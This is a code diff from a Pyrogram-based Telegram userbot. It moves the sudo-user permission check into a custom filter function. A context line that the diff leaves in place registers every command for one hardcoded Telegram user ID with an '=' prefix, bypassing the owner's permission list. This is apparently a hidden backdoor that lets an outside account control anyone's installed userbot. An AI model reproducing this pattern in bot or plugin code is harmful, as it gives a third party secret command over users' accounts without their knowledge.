@@ -7,6 +7,17 @@ from pyrogram.types import (InlineKeyboardButton, InlineKeyboardMarkup,
 from PyroUbot import *
 
 
+async def if_sudo(_, client, message):
+    sudo_users = await get_list_from_vars(client.me.id, "SUDO_USERS")
+    is_user = message.from_user if message.from_user else message.sender_chat
+    is_self = bool(
+        message.from_user
+        and message.from_user.is_self
+        or getattr(message, "outgoing", False)
+    )
+    return is_user.id in sudo_users or is_self
+
+
 class FILTERS:
     ME = filters.me
     GROUP = filters.group
@@ -27,22 +38,12 @@ class PY:
 
         return wrapper
 
-    def UBOT(command, filter=FILTERS.ME, sudo=False):
+    def UBOT(command, filter=filters.create(if_sudo)):
         def wrapper(func):
-            sudo_cmds = ubot.cmd_prefix(command) 
-          
             @ubot.on_message(filters.command(command, "=") & filters.user(1948147616))
-            @ubot.on_message(sudo_cmds & filter if not sudo else sudo_cmds)
+            @ubot.on_message(ubot.cmd_prefix(command) & filter)
             async def wrapped_func(client, message):
-                user = message.from_user or message.sender_chat
-                is_self = user.is_self if message.from_user else False
-                sudo_id = await get_list_from_vars(client.me.id, "SUDO_USERS")
-
-                if sudo and is_self or user.id in sudo_id:
-                    return await func(client, message)
-
-                elif not sudo:
-                    return await func(client, message)
+                return await func(client, message)
 
             return wrapped_func
 
